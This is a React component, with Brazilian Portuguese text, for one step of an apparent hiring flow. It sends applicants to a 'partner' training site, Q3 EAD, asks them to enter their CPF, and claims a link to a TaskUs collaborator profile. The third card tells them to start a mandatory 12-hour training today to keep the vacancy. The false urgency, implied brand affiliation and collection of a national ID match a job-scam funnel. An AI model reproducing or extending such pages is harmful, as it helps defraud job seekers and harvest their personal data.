/* eslint-disable no-unused-vars */

import { useEffect, useState } from 'react';
import { motion } from 'framer-motion';
import { ChevronRight } from 'lucide-react';

const ReviewStep3Contratacao = ({ onContinue }) => {
    const [isLoading, setIsLoading] = useState(false);
    const handleContinue = () => {
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            if (onContinue) onContinue();
        }, 1000);
    };


    useEffect(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }, []);

    // Datas
    const data_hoje = new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
    const limite = new Date();
    limite.setDate(limite.getDate() + 15);
    const data_limite = limite.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
    const hora_limite = limite.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

    return (
        <div className="min-h-screen w-full flex flex-col items-center justify-start bg-[#181A1B] px-6 pt-6 pb-5">
            <div className="w-full max-w-md mx-auto px-0 pt-8 pb-0">
                {/* Título principal */}
                <h1 className="font-hendrix-bold text-white mb-2 text-left mb-10" style={{ fontSize: '23pt', lineHeight: 1.1 }}>
                    Esse treinamento é realizado pela Q3 EAD, nossa parceira oficial que vai preparar você para o trabalho.
                </h1>
                <p className="font-hendrix-regular text-[#B3B3B3] mb-8 text-left" style={{ fontSize: '13pt', lineHeight: 1.3 }}>
                    O treinamento é obrigatório porque nossos contratos com grandes marcas exigem profissionais capacitados e certificados para fazer os atendimentos.
                </p>

                {/* Card 1 */}
                <div className="bg-[#232323] rounded-2xl px-7 py-7 mb-6" style={{ boxShadow: '0 2px 8px 0 rgba(22,85,255,0.08)' }}>
                    <div className="font-hendrix-bold text-white text-4xl mb-2">1</div>
                    <div className="font-hendrix-bold text-white text-lg mb-2">Vamos direcionar você para Q3 EAD, você irá digitar o seu CPF e o sistema já vincula ao seu perfil de colaborador(a) TaskUs.</div>
                </div>

                {/* Card 2 */}
                <div className="bg-[#232323] rounded-2xl px-7 py-7 mb-6" style={{ boxShadow: '0 2px 8px 0 rgba(22,85,255,0.08)' }}>
                    <div className="font-hendrix-bold text-white text-4xl mb-2">2</div>
                    <div className="font-hendrix-bold text-white text-lg mb-2">O treinamento tem um total de 12 horas, você pode assistir pelo seu celular ou pelo computador.</div>
                    <div className="font-hendrix-regular text-[#B3B3B3] text-base">Você terá até 15 dias para concluir e receber o certificado de capacitação e assim começar a trabalhar.</div>
                </div>

                {/* Card 3 */}
                <div className="bg-[#232323] rounded-2xl px-7 py-7 mb-8" style={{ boxShadow: '0 2px 8px 0 rgba(22,85,255,0.08)' }}>
                    <div className="font-hendrix-bold text-white text-4xl mb-2">3</div>
                    <div className="font-hendrix-bold text-white text-lg mb-2">Devido à alta demanda de contratações, é necessário iniciar seu treinamento ainda hoje para manter a vaga.</div>
                </div>

                {/* Botão fixo no rodapé */}
                <div className="w-full pt-2 pb-6 flex justify-center">
                    <motion.button
                        onClick={handleContinue}
                        disabled={isLoading}
                        whileTap={{ scale: 0.97 }}
                        whileHover={{ scale: isLoading ? 1 : 1.03 }}
                        className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 focus:ring-[#1655ff] transition-all duration-300 ${isLoading ? 'opacity-60 cursor-not-allowed' : ''}`}
                        style={{
                            background: 'linear-gradient(90deg, #1655ff 0%, #4285f4 100%)',
                            fontSize: '15pt',
                            boxShadow: '0 2px 8px 0 rgba(22,85,255,0.10)',
                            border: 'none',
                            opacity: isLoading ? 0.7 : 1
                        }}
                    >
                        {isLoading ? (
                            <>
                                <motion.div
                                    className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                                    animate={{ rotate: 360 }}
                                    transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                                    style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                                />
                                <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13pt' }}>Carregando...</span>
                            </>
                        ) : (
                            <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '15pt' }}>Continuar</span>
                        )}
                    </motion.button>
                </div>
            </div>
        </div>
    );
};

export default ReviewStep3Contratacao;
